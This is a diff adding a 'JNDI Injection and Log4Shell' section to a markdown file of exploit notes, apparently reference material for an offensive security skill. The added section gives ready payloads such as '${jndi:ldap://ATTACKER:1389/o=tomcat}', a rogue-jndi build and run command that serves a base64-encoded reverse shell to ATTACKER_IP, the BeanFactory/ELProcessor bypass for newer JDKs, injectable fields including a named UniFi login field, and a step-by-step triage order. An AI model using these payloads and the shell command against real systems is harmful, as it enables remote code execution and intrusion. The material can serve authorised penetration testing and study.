@@ -19,6 +19,7 @@ Long-form exploit notes that were moved out of `SKILL.md` so the main skill can 
 - [PHP File Inclusion / LFI Quick Reference](#php-file-inclusion-lfi-quick-reference)
 - [Code Injection Quick Reference](#code-injection-quick-reference)
 - [Java Deserialization](#java-deserialization)
+- [JNDI Injection and Log4Shell](#jndi-injection-and-log4shell)
 - [Python Pickle Deserialization](#python-pickle-deserialization)
 - [Race Conditions (Time-of-Check to Time-of-Use)](#race-conditions-time-of-check-to-time-of-use)
 - [Node.js Quick Reference](#nodejs-quick-reference)
@@ -247,6 +248,51 @@ See [server-execution.md](server-execution.md) for full payloads and bypass tech
 ## Java Deserialization
 
 Serialized Java objects (`rO0AB` / `aced0005`) + ysoserial gadget chains → RCE via `ObjectInputStream.readObject()`. Try `CommonsCollections1-7`, `URLDNS` for blind detection. See [server-execution.md](server-execution.md).
+
+## JNDI Injection and Log4Shell
+
+Any sink calling `InitialContext.lookup(attacker_input)` enables JNDI injection. Most famous: **Log4Shell (CVE-2021-44228)** — Log4j 2.x evaluates `${jndi:ldap://attacker/path}` in logged strings.
+
+**Common JNDI sinks** (beyond Log4j): Spring `lookup()`, Shiro JndiTemplate, any `env.lookup()` on user input, LDAP/RMI/DNS configured names.
+
+**Attack flow:**
+1. Attacker injects `${jndi:ldap://ATTACKER:1389/o=tomcat}` into any logged/evaluated field
+2. Target's JNDI client connects to attacker LDAP server
+3. LDAP response delivers execution payload
+
+**Two LDAP response types — critical distinction:**
+
+| LDAP Attribute | Behavior | When it works |
+|----------------|----------|---------------|
+| `javaSerializedData` | Target calls `ObjectInputStream.readObject()` | Requires gadget chain in classpath (CC, Spring, etc.) |
+| `javaReferenceAddress` + `javaFactory` | Target calls `NamingManager.getObjectInstance()` → factory class | Requires factory class on local classpath |
+
+**BeanFactory/ELProcessor bypass** (works when `trustURLCodebase=false`, JDK 8u191+):
+- Requires Tomcat on classpath (embedded or standalone)
+- LDAP response specifies `javaFactory: org.apache.naming.factory.BeanFactory`
+- `javaClassName: javax.el.ELProcessor`
+- `javaReferenceAddress` entries set `forceString` to route method calls → `ELProcessor.eval()` → arbitrary Java execution
+
+**Tool: rogue-jndi** (`github.com/veracode-research/rogue-jndi`):
+```bash
+# Build
+git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package -q
+
+# Run (o=tomcat = BeanFactory/ELProcessor route)
+java -jar target/RogueJndi-1.1.jar \
+    --command "bash -c {echo,BASE64_REVSHELL}|{base64,-d}|{bash,-i}" \
+    --hostname ATTACKER_IP -p 8888
+```
+
+**Command encoding for EL expressions:** Shell metacharacters break EL parsing. Use brace expansion: `bash -c {echo,BASE64}|{base64,-d}|{bash,-i}` avoids spaces/redirects/pipes in the EL string.
+
+**Trigger points:** HTTP headers, cookies, form fields, user-agent, X-Forwarded-For, URL paths — anything the app logs via Log4j. UniFi Network Application logs the `remember` field in login POST requests.
+
+**Triage:**
+1. Confirm callback: inject `${jndi:ldap://ATTACKER:1389/test}` → check for LDAP connection
+2. If callback received: run rogue-jndi with `o=tomcat` for BeanFactory bypass
+3. If no callback: try `${jndi:dns://ATTACKER/test}` (simpler, fewer blockers)
+4. If BeanFactory fails: try Groovy route (`o=groovy`) or remote reference (`o=reference`) on older JDK
 
 ## Python Pickle Deserialization
 
